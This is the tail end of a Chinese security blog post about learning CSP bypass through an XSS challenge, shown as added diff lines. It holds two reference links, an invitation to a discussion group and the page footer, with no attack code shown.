+<a href="https://csp-evaluator.withgoogle.com/"target="_blank" rel="external nofollow noopener noreferrer">https://csp-evaluator.withgoogle.com/</a><br>
+<a href="https://github.com/Mehdi0x90/Web_Hacking/blob/main/CSP%20Bypass.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Mehdi0x90/Web_Hacking/blob/main/CSP%20Bypass.md</a></p>
+<h2 id="0x00000" class="heading-element"><span>0x00000</span>
+  <a href="#0x00000" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>弟弟新建了一个交流群，欢迎有兴趣的师傅一起来讨论有趣的Web题
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502101949106.jpg" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-02-11 00:06:40">Updated on 2025-02-11&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87/" data-title="从一道XSS题学习CSP绕过"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/xss/" class="post-tag" title="Tags - XSS">XSS</a><a href="/tags/unicode/" class="post-tag" title="Tags - Unicode">Unicode</a><a href="/tags/csp/" class="post-tag" title="Tags - CSP">CSP</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/2025-n1ctf-junior-web%E7%AF%87%E5%85%A8/" class="post-nav-item" rel="prev" title="2025-N1CTF Junior-Web篇(全)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>2025-N1CTF Junior-Web篇(全)</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
